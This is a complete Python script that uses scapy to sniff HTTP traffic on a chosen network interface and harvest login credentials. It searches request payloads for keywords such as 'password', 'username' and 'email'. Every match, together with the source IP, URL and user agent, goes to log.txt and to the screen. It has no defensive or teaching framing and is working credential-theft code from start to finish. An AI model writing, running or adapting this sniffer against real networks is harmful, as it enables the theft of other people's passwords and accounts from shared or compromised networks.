#!/usr/bin/env python

import scapy.all as scapy
import argparse
from scapy.layers import http


def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        url_string = url.decode('utf-8')
        user_agent = packet[http.HTTPRequest].User_Agent
        user_agent_string = user_agent.decode('utf-8')

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "pw", "email"]
            for key in keys:
                if key in load.decode('latin-1'):
                    file = open("log.txt", "a")
                    file.write("[0_0] Possible password/username >> " + load.decode('utf-8') + "\n")
                    file.write("[*_*] From >> " + packet[1].src + " -> " + url_string + "\n")
                    file.write("['_'] User Agent >> " + user_agent_string + "\n")
                    file.write("[-_-]==============================================================================\n")
                    file.close()

                    print("[0_0] Possible password/username >> " + load.decode('utf-8'))
                    print("[*_*] From >> " + packet[1].src + " -> " + url_string)
                    print("['_'] User Agent >> " + user_agent_string)
                    print("[-_-]===============================================================================")
                    break


print("Running and listening for HTTP POST login packets.")
sniff(get_interface())
